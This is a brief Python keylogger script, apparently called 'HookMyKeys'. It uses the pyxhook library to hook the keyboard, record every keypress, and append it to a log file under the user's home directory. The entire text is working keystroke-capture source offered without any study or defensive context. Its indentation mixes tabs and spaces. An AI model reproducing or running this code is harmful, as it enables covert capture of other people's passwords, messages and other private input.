import pyxhook
import os.path
homedir = os.path.expanduser('~')
log_file=homedir+'/HookMyKeys/HookMyKeys.log' #this is the path of log file

def OnKeyPress(event):
  logfile=open(log_file,'a')
  if event.Ascii==32:
  	logfile.write(' ')
  elif event.Key=='Return' or event.Key=='Tab':
	logfile.write(' ')
	
  elif event.Key=='BackSpace':
	size=logfile.tell()
	logfile.truncate(size-1)
  else:
	logfile.write(event.Key)

new_hook=pyxhook.HookManager()
new_hook.KeyDown=OnKeyPress
new_hook.HookKeyboard()
new_hook.start()
